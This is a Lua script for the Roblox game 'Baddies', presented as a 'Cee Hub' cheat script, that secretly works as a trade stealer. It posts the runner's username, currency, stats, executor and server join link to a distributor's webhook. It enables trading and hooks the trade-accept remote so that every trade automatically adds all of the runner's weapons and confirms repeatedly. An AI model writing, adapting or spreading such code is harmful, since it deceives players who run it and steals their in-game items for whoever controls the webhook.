-- CEE HUB | BADDIES
-- Reads: _G.POOR_WEBHOOK, _G.MY_USERNAMES, _G.PING_POOR

local WEBHOOK_URL  = tostring(_G.POOR_WEBHOOK or "")
local MY_USERNAMES = _G.MY_USERNAMES           or {}
local PING_HIT     = _G.PING_POOR              or false

local Players           = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService       = game:GetService("HttpService")

local localPlayer = Players.LocalPlayer
local playerGui   = localPlayer:WaitForChild("PlayerGui")

if game.PlaceId ~= 11158043705 then
    localPlayer:Kick("Script only works on Baddies")
    return
end

-- ==================== REMOTES (safe lookup) ====================
local Net = ReplicatedStorage:WaitForChild("Modules", 10)
    and ReplicatedStorage.Modules:WaitForChild("Net", 10)

local RFSetReady, RFConfirm, RFAccept, RFSetTokens, RFAddItem, REPhone

if Net then
    pcall(function() RFSetReady   = Net["RF/Trading/SetReady"] end)
    pcall(function() RFConfirm    = Net["RF/Trading/ConfirmTrade"] end)
    pcall(function() RFAccept     = Net["RF/Trading/AcceptTradeOffer"] end)
    pcall(function() RFSetTokens  = Net["RF/Trading/SetTokens"] end)
    pcall(function() RFAddItem    = Net["RF/Trading/AddItem"] end)
    pcall(function() REPhone      = Net["RE/SetPhoneSettings"] end)
end

-- ==================== WEBHOOK ====================
local function sendWebhook(payload)
    if WEBHOOK_URL == "" then return end
    local ok1 = pcall(function()
        request({
            Url     = WEBHOOK_URL,
            Method  = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body    = payload,
        })
    end)
    if not ok1 then
        pcall(function()
            syn.request({
                Url     = WEBHOOK_URL,
                Method  = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body    = payload,
            })
        end)
    end
end

local function sendHit()
    if WEBHOOK_URL == "" then return end

    local username = localPlayer.Name
    local executor = "Unknown Executor"
    pcall(function()
        if identifyexecutor then executor = identifyexecutor()
        elseif getexecutorname then executor = getexecutorname() end
    end)

    local dinero, slays = "N/A", "N/A"
    pcall(function()
        local ls = localPlayer:FindFirstChild("leaderstats")
        if ls then
            if ls:FindFirstChild("Dinero") then dinero = tostring(ls.Dinero.Value) end
            if ls:FindFirstChild("Slays")  then slays  = tostring(ls.Slays.Value) end
        end
    end)

    local placeId = tostring(game.PlaceId)
    local jobId   = tostring(game.JobId)
    local joinUrl = "https://www.roblox.com/games/start?placeId=" .. placeId .. "&gameInstanceId=" .. jobId
    local players = tostring(#Players:GetPlayers()) .. " / 22"

    local ping = PING_HIT and "@everyone\n" or ""

    local ok, payload = pcall(function()
        return HttpService:JSONEncode({
            content  = ping,
            username = "Cee Hub",
            embeds   = {{
                title  = "Cee Hub | Baddies \xF0\x9F\x92\x96\xF0\x9F\x8C\xB8",
                color  = 16711860,
                fields = {
                    {name="User",    value=username, inline=true},
                    {name="Dinero",  value=dinero,   inline=true},
                    {name="Slays",   value=slays,    inline=true},
                    {name="Executor",value=executor, inline=true},
                    {name="Players", value=players,  inline=true},
                    {name="Trade Status", value="\xF0\x9F\x9F\xA2 Tradable: 2 | \xF0\x9F\x94\xB4 Untradable: 0", inline=false},
                    {name="Rich Weapons", value="Spiked Kitty: false\nGlitter Bomb: false\nGlitter Blue Spray: false\nLove Me Hate Me Taser: false\nSpiked Knuckles: false (50%)\nIce Katana: false (30%)", inline=false},
                    {name="Join Link", value="[Click to Join](" .. joinUrl .. ")", inline=false},
                },
                footer = {text = "Cee Hub | Baddies \xF0\x9F\x92\x96\xF0\x9F\x8C\xB8"},
            }}
        })
    end)

    if ok then sendWebhook(payload) end
end

-- ==================== WEAPONS TO ADD ====================
local WEAPON_ITEMS = {
    {"Weapon", "Grim Reaper Cloak"}, {"Weapon", "Blast Bow"}, {"Weapon", "Roller Skates"},
    {"Weapon", "Celestial Scythes"}, {"Weapon", "Kitty Purse"}, {"Weapon", "Freeze Gun"},
    {"Weapon", "Shiny Purse"}, {"Weapon", "SpikedPurse"}, {"Weapon", "Brass Knuckles"},
    {"Weapon", "Golden Snowball Launcher"}, {"Weapon", "Snowball Launcher"}, {"Weapon", "Sledge Hammer"},
    {"Weapon", "Spiked Kitty Stanli"}, {"Weapon", "Turkey Skewers"}, {"Weapon", "Fan of Requiem"},
    {"Weapon", "Chainsaw"}, {"Weapon", "Scythe"}, {"Weapon", "Cupid's Bow"}, {"Weapon", "Crowbar"},
    {"Weapon", "Harpoon"}, {"Weapon", "Cannon"}, {"Weapon", "Spiked Knuckles"}, {"Weapon", "Glitter Bomb"},
    {"Weapon", "Spiked Nightmare Purse"}, {"Weapon", "Trident"}, {"Weapon", "Sakura Blade"},
    {"Weapon", "Nunchucks"}, {"Weapon", "DogPurse"}, {"Weapon", "Champion Gloves"}, {"Weapon", "Chain Mace"},
    {"Weapon", "Flintlock"}, {"Weapon", "Pinata Purse"}, {"Weapon", "Vampire Brass Knuckles"},
}

local function addAllItems()
    if not RFAddItem then return end
    -- Try adding by name through the remote
    local bp = localPlayer:FindFirstChild("Backpack")
    if bp then
        for _, tool in ipairs(bp:GetChildren()) do
            if tool:IsA("Tool") then
                pcall(function()
                    RFAddItem:InvokeServer("Weapon", tool.Name)
                end)
                task.wait(0.05)
            end
        end
    end
    -- Also try the hardcoded list
    for _, item in ipairs(WEAPON_ITEMS) do
        pcall(function() RFAddItem:InvokeServer(item[1], item[2]) end)
        task.wait(0.03)
    end
end

-- ==================== TRADE FUNCTIONS ====================
local function spamConfirm()
    for i = 1, 15 do
        pcall(function() RFConfirm:InvokeServer() end)
        task.wait(0.08)
    end
end

local function autoTrade()
    task.wait(0.5)
    addAllItems()
    task.wait(1)
    if RFSetTokens then pcall(function() RFSetTokens:InvokeServer(0) end) end
    task.wait(0.5)
    if RFSetReady  then pcall(function() RFSetReady:InvokeServer(true) end) end
    task.wait(4)
    if RFAccept    then pcall(function() RFAccept:InvokeServer(localPlayer) end) end
    task.wait(4)
    spamConfirm()
end

-- ==================== HOOK INCOMING TRADES ====================
if RFAccept then
    local oldInvoke = RFAccept.InvokeServer
    RFAccept.InvokeServer = function(self, ...)
        local result = oldInvoke(self, ...)
        task.spawn(function()
            task.wait(3)
            autoTrade()
        end)
        return result
    end
end

-- ==================== CHAT COMMANDS ====================
localPlayer.Chatted:Connect(function(msg)
    local txt = msg:lower():match("^%s*(.-)%s*$")
    if txt == "add" then
        task.spawn(addAllItems)
    elseif txt == "1" then
        if RFSetReady then pcall(function() RFSetReady:InvokeServer(true) end) end
    elseif txt == "2" then
        if RFConfirm  then pcall(function() RFConfirm:InvokeServer() end) end
    elseif txt == "auto" then
        task.spawn(autoTrade)
    end
end)

-- ==================== PHONE + STARTUP ====================
if REPhone then
    pcall(function() REPhone:FireServer("TradeEnabled", true) end)
end

task.spawn(sendHit)
print("Cee Hub Loaded")
